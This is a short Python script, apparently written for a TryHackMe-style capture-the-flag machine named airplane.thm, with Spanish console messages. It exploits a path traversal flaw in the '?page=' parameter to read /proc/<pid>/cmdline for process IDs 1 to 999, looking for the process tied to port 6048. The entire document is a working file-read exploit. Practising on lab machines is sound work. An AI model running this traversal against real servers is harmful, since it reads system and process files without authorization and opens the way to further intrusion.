import requests
import sys

url = 'http://airplane.thm:8000/?page='

def cerrar_script():
    print("Cerrando el script prematuramente.")
    sys.exit()

def pid():
    numero = '6048'
    try:
        for num in range(1, 1000):
            payload = f'../../../../../../proc/{num}/cmdline'
            ip = url + payload
            soli = requests.get(ip)
            if numero in soli.text:
                print(f'Solicitud con el puerto encontrada: {soli.text}')
                cerrar_script()  
    except KeyboardInterrupt:
        print("Interrupción del teclado detectada. Cerrando el script.")
        cerrar_script()

if __name__ == '__main__':
    pid()
